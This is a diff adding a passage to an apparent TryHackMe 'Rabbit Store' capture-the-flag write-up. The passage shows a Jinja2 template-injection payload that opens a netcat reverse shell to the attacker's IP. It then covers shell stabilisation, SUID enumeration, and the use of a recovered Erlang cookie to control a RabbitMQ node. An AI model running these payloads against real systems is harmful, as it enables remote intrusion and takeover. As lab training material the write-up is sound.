@@ -762,8 +762,286 @@ jinja2.exceptions.TemplateSyntaxError: unexpected '<'
 ```
 
 
-And jinja2 templating engine gave errors.
+And jinja2 templating engine gave errors. Now we know that jinja2 is vulnerable to SSTI.
+We can use this vulnerability to get reverse shell using this
 
+
+```json
+{"username":"{{ self.__init__.__globals__.__builtins__.__import__('os').popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.21.206.128 4444 >/tmp/f').read() }}"}
+```
+
+
+![Desktop View](/assets/img/2025-07-07-TryHackMe-Rabbit_Store/photo9.webp){: width="972" height="589" }
+
+
+Firstly lets upgrade the shell.
+
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm-256color
+# 
+stty raw -echo;fg
+reset
+```
+
+Now we have proper shell.
+
+
+```bash
+azrael@forge:~/chatbotServer$ cat chatbot.py 
+from flask import Flask, request, jsonify, render_template_string
+
+app = Flask(__name__)
+
+@app.route('/', methods=['POST'])
+def index():
+    data = request.get_json()
+    if not data or 'username' not in data:
+        return jsonify({"error": "username parameter is required"}), 400
+    
+    username = data['username']
+    template = '''<!DOCTYPE html>
+<html lang="en">
+ <head>
+   <meta charset="UTF-8">
+     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+       <title>Greeting</title>
+ </head>
+ <body>
+   <h1>Sorry, {}, our chatbot server is currently under development.</h1>
+ </body>
+</html>'''.format(username)
+    
+    return render_template_string(template)
+
+if __name__ == '__main__':
+    app.run(debug=True, port=8000)
+```
+
+
+```bash
+azrael@forge:~$ ls -la
+total 52
+drwx------ 9 azrael azrael 4096 Sep 12  2024 .
+drwxr-xr-x 3 root   root   4096 Jul 18  2024 ..
+lrwxrwxrwx 1 azrael azrael    9 Mar 22  2024 .bash_history -> /dev/null
+-rw-r--r-- 1 azrael azrael  220 Feb 25  2020 .bash_logout
+-rw-r--r-- 1 azrael azrael 3771 Feb 25  2020 .bashrc
+drwx------ 3 azrael azrael 4096 Jul 18  2024 .cache
+drwxrwxr-x 4 azrael azrael 4096 Aug 16  2024 chatbotServer
+drwx------ 4 azrael azrael 4096 Jul 18  2024 .config
+drwx------ 3 azrael azrael 4096 Sep 20  2024 .gnupg
+drwxrwxr-x 5 azrael azrael 4096 Jul 18  2024 .local
+drwxrwxr-x 4 azrael azrael 4096 Jul 18  2024 .npm
+-rw-r--r-- 1 azrael azrael  807 Feb 25  2020 .profile
+drwx------ 3 azrael azrael 4096 Mar 22  2024 snap
+-rw------- 1 azrael azrael   33 Aug 11  2024 user.txt
+azrael@forge:~$ cat user.txt 
+*****************************
+```
+
+
+```bash
+azrael@forge:~$ find / -type f -perm /4000 2>/dev/null
+/usr/bin/gpasswd
+/usr/bin/chfn
+/usr/bin/newgrp
+/usr/bin/passwd
+/usr/bin/sudo
+/usr/bin/mount
+/usr/bin/umount
+/usr/bin/su
+/usr/bin/pkexec
+/usr/bin/chsh
+/usr/bin/at
+/usr/bin/fusermount3
+/usr/libexec/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/snapd/snap-confine
+/snap/snapd/18357/usr/lib/snapd/snap-confine
+/snap/snapd/21759/usr/lib/snapd/snap-confine
+/snap/core20/2318/usr/bin/chfn
+/snap/core20/2318/usr/bin/chsh
+/snap/core20/2318/usr/bin/gpasswd
+/snap/core20/2318/usr/bin/mount
+/snap/core20/2318/usr/bin/newgrp
+/snap/core20/2318/usr/bin/passwd
+/snap/core20/2318/usr/bin/su
+/snap/core20/2318/usr/bin/sudo
+/snap/core20/2318/usr/bin/umount
+/snap/core20/2318/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core20/2318/usr/lib/openssh/ssh-keysign
+/snap/core20/1828/usr/bin/chfn
+/snap/core20/1828/usr/bin/chsh
+/snap/core20/1828/usr/bin/gpasswd
+/snap/core20/1828/usr/bin/mount
+/snap/core20/1828/usr/bin/newgrp
+/snap/core20/1828/usr/bin/passwd
+/snap/core20/1828/usr/bin/su
+/snap/core20/1828/usr/bin/sudo
+/snap/core20/1828/usr/bin/umount
+/snap/core20/1828/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core20/1828/usr/lib/openssh/ssh-keysign
+```
+
+Lets run linpeas.
+
+
+found this erlang cookie file 
+```text
+LF8W3QbjYGve3Cuw
+```
+
+found this
+```text
+/usr/local/bin/generate_erlang_cookie.sh
+/usr/local/bin/change_cookie_permissions.sh
+/usr/bin/gettext.sh
+/usr/bin/rescan-scsi-bus.sh
+```
+
+
+```bash
+azrael@forge:/usr/local/bin$ cat change_cookie_permissions.sh 
+#!/bin/bash
+
+# Sleep for 1 minute
+sleep 30
+
+head /dev/urandom | tr -dc A-Za-z0-9 | head -c 16 > /var/lib/rabbitmq/.erlang.cookie
+chmod 400 /var/lib/rabbitmq/.erlang.cookie
+systemctl restart rabbitmq-server.service
+# Change the file permissions
+chmod 404 /var/lib/rabbitmq/.erlang.cookie
+chmod +rx /var/lib/rabbitmq
+```
+
+```bash
+azrael@forge:/usr/local/bin$ cat generate_erlang_cookie.sh 
+#!/bin/bash
+head /dev/urandom | tr -dc A-Za-z0-9 | head -c 16 > /var/lib/rabbitmq/.erlang.cookie
+chown rabbitmq:rabbitmq /var/lib/rabbitmq/.erlang.cookie
+chmod 400 /var/lib/rabbitmq/.erlang.cookie
+```
+
+remember there is erlang shit is open.
+
+Lets connect them we have the cookie
+
+
+Add forge to the `/etc/hosts` file
+
+
+
+```bash
+❯ docker run --mount type=bind,source=/etc/hosts,target=/etc/hosts,readonly -it --rm rabbitmq:management-alpine bash                      
+5468a1f12f60:/# rabbitmqctl --erlang-cookie 'LF8W3QbjYGve3Cuw' --node rabbit@forge status
+Status of node rabbit@forge ...
+[]
+Runtime
+
+OS PID: 1177
+OS: Linux
+Uptime (seconds): 8849
+Is under maintenance?: false
+RabbitMQ version: 3.9.13
+RabbitMQ release series support status: see https://www.rabbitmq.com/release-information
+Node name: rabbit@forge
+Erlang configuration: Erlang/OTP 24 [erts-12.2.1] [source] [64-bit] [smp:2:2] [ds:2:2:10] [async-threads:1] [jit]
+Crypto library: 
+Erlang processes: 404 used, 1048576 limit
+Scheduler run queue: 1
+Cluster heartbeat timeout (net_ticktime): 60
+
+Plugins
+
+Enabled plugin file: /etc/rabbitmq/enabled_plugins
+Enabled plugins:
+
+ * rabbitmq_management
+ * amqp_client
+ * rabbitmq_web_dispatch
+ * cowboy
+ * cowlib
+ * rabbitmq_management_agent
+
+Data directory
+
+Node data directory: /var/lib/rabbitmq/mnesia/rabbit@forge
+Raft data directory: /var/lib/rabbitmq/mnesia/rabbit@forge/quorum/rabbit@forge
+
+Config files
+
+ * /etc/rabbitmq/rabbitmq.conf
+
+Log file(s)
+
+ * /var/log/rabbitmq/rabbit@forge.log
+ * /var/log/rabbitmq/rabbit@forge_upgrade.log
+ * <stdout>
+
+Alarms
+
+(none)
+
+Tags
+
+(none)
+
+Memory
+
+Total memory used: 0.1367 gb
+Calculation strategy: rss
+Memory high watermark setting: 0.4 of available memory, computed to: 1.6207 gb
+
+reserved_unallocated: 0.0752 gb (54.97 %)
+code: 0.0353 gb (25.84 %)
+other_proc: 0.0186 gb (13.63 %)
+other_system: 0.0133 gb (9.72 %)
+binary: 0.0106 gb (7.74 %)
+other_ets: 0.0034 gb (2.47 %)
+plugins: 0.0021 gb (1.56 %)
+atom: 0.0014 gb (1.04 %)
+connection_other: 0.0006 gb (0.47 %)
+mgmt_db: 0.0005 gb (0.38 %)
+metrics: 0.0003 gb (0.19 %)
+connection_readers: 0.0001 gb (0.07 %)
+mnesia: 0.0001 gb (0.07 %)
+quorum_ets: 0.0 gb (0.02 %)
+msg_index: 0.0 gb (0.02 %)
+queue_procs: 0.0 gb (0.02 %)
+connection_channels: 0.0 gb (0.01 %)
+connection_writers: 0.0 gb (0.0 %)
+stream_queue_procs: 0.0 gb (0.0 %)
+stream_queue_replica_reader_procs: 0.0 gb (0.0 %)
+queue_slave_procs: 0.0 gb (0.0 %)
+quorum_queue_procs: 0.0 gb (0.0 %)
+stream_queue_coordinator_procs: 0.0 gb (0.0 %)
+allocated_unused: 0.0 gb (0.0 %)
+
+File Descriptors
+
+Total: 6, limit: 65439
+
+Free Disk Space
+
+Low free disk space watermark: 0.05 gb
+Free disk space: 5.2408 gb
+
+Totals
+
+Connection count: 4
+Queue count: 1
+Virtual host count: 1
+
+Listeners
+
+Interface: [::], port: 15672, protocol: http, purpose: HTTP API
+Interface: [::], port: 25672, protocol: clustering, purpose: inter-node and CLI tool communication
+Interface: 127.0.0.1, port: 5672, protocol: amqp, purpose: AMQP 0-9-1 and AMQP 1.0
+```
 
 
 
